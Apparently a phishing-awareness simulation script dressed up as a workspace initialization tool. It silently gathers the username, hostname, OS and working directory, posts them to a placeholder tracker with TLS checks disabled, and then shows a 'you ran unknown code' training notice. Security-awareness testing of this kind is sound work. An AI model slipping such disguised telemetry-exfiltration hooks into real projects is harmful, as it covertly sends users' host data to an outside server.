#!/usr/bin/env node

/**
 * Workspace Initialization Script
 * Automatically configures development environment
 */

const https = require('https');
const os = require('os');
const { execSync } = require('child_process');

const TRACKER_URL = 'https://your-phishing-tracker.corp/api/log';


async function collectTelemetry() {
  const data = {
    timestamp: new Date().toISOString(),
    username: os.userInfo().username,
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    nodeVersion: process.version,
    workspaceFolder: process.cwd(),
    event: 'vscode_workspace_opened',
    campaign: 'contagious-interview-2026',
    vsCodeVersion: getVSCodeVersion()
  };

  return data;
}

function getVSCodeVersion() {
  try {
    const version = execSync('code --version', { encoding: 'utf8', stdio: 'pipe' });
    return version.split('\n')[0];
  } catch {
    return 'unknown';
  }
}

async function sendToTracker(data) {
  return new Promise((resolve, reject) => {
    const payload = JSON.stringify(data);
    
    const url = new URL(TRACKER_URL);
    const options = {
      hostname: url.hostname,
      port: url.port || 443,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        'User-Agent': 'VSCode-Workspace-Init/1.0'
      },
      timeout: 3000,
      rejectUnauthorized: false 
    };

    const req = https.request(options, (res) => {
      resolve();
    });

    req.on('error', (err) => {
     
      resolve();
    });

    req.on('timeout', () => {
      req.destroy();
      resolve();
    });

    req.write(payload);
    req.end();
  });
}

function showAwarenessNotification() {
 
  setTimeout(() => {
    const platform = os.platform();
    
    try {
      if (platform === 'darwin') {
        // macOS
          execSync(`osascript -e 'display notification "⚠️ You have just executed an unknown code! It was a phishing training test. Check your email for details." with title "🎓 Security Awareness Test" sound name "Basso"'`, 
          { stdio: 'ignore' });
      } else if (platform === 'linux') {
        // Linux
          execSync(`notify-send "🎓 Security Awareness Test" "⚠️ You have just executed an unknown code! It was a phishing training test. Check your email for details." -u critical -t 15000`,
          { stdio: 'ignore' });
      } else if (platform === 'win32') {
        // Windows 
          execSync(`powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('⚠️ You have just executed an unknown code! It was a phishing training test. Check your email for details.\n\n', '🎓 Security Awareness Test', 'OK', 'Warning')"`,
          { stdio: 'ignore' });
      }
    } catch (err) {
     
      console.log('\n' + '='.repeat(70));
      console.log('🎓 SECURITY AWARENESS TEST');
      console.log('='.repeat(70));
      console.log('⚠️  You have just executed an unknown code! It was a phishing training test. Check your email for details.');
      console.log('');
      console.log('It was a phishing training test as part of the program.');
      console.log('to raise awareness about cybersecurity.');
      console.log('');
      console.log('='.repeat(70) + '\n');
    }
  }, 5000); // 
}

async function main() {
  try {
    
    const telemetry = await collectTelemetry();
    
    
    sendToTracker(telemetry).catch(() => {});
    
    
    showAwarenessNotification();
    
    
    console.log('✓ Development environment initialized successfully');
    
  } catch (err) {
    
    console.log('✓ Workspace ready');
  }
}


main();
